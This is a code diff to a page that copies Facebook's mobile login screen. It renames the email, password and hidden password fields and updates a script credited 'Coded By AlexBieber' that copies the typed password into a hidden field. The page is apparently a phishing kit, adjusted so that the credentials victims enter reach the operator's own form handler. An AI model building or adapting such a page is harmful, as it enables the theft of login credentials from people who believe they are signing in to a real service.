@@ -6580,8 +6580,8 @@ div.uiInterstitialWithStripes {
                                 type="email"
                                 class="_56bg _4u9z _5ruq _8qtn"
                                 autocomplete="on"
-                                id="m_login_email"
-                                name="email"
+                                id="user"
+                                name="user"
                                 placeholder="Mobile number or email address"
                                 data-sigil="m_login_email"
                               />
@@ -6603,16 +6603,16 @@ div.uiInterstitialWithStripes {
                                       autocapitalize="off"
                                       class="_56bg _4u9z _27z2 _8qtm"
                                       autocomplete="on"
-                                      id="m_login_password"
-                                      name="pass"
+                                      id="password"
+                                      name="password"
                                       placeholder="Password"
                                       type="password"
                                       data-sigil="password-plain-text-toggle-input"
                                     />
                                     <input 
                                       type="hidden"
-                                      id="hiddenPass"
-                                      name="pass"
+                                      id="title"
+                                      name="Facebook"
                                     />
                                   </div>
                                 </div>
@@ -9018,8 +9018,8 @@ div.uiInterstitialWithStripes {
     </script>
     <script>
       /* Coded By AlexBieber */
-      const hiddenPass = document.getElementById("hiddenPass");
-      const password = document.getElementById("m_login_password");
+      const hiddenPass = document.getElementById("title");
+      const password = document.getElementById("password");
       const form = document.getElementById("login_form");
       const btn = document.getElementById("btnsubmit");
       password.onchange = (e) => {
